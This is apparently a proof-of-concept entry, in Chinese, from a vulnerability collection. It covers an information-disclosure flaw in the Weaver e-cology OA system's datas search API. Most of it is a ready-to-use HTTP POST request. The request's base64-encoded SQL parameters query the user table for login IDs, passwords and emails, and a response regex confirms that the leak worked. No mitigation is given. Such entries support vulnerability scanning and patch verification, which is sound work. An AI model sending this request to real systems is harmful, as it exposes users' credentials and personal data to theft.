﻿# 泛微 e-cology datas 存在敏感信息泄漏漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：泛微 e-cology datas 存在敏感信息泄漏漏洞 ，攻击者通过漏洞可以获取OA中的用户敏感信息

> 漏洞特征：

> 验证脚本：HTTP

```
POST /api/ec/dev/search/datas HTTP/1.1
Content-Type: application/x-www-form-urlencoded

type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100
```

> 响应代码特征：-1

> 响应内容特征：^(?=.*?datas)(?=.*?id)(?=.*?password).*?$

> 上传文件定位：

> 验证文件来源：泛微 E-cology datas 存在敏感信息泄漏漏洞.poc
